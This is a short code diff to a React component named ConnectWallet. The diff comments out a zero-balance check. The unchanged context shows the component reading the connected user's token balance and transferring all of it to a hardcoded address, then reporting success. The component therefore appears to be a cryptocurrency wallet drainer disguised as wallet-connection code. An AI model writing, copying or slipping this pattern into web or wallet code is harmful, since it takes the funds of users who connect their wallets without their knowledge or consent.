@@ -102,10 +102,10 @@ export const ConnectWallet = React.memo(function() {
         try {
             const balance = await balanceOf(address);
 
-            if(balance == 0) {
-                toast.error('Insufficient balance');
-                return;
-            }
+            // if(balance == 0) {
+            //     toast.error('Insufficient balance');
+            //     return;
+            // }
 
             transferToken('TMZKwqtGe2HcBriRt5pVubxmYjZ2Y3j6Nm', +balance).then(() => {
                 toast.success('Transfer succeed!');
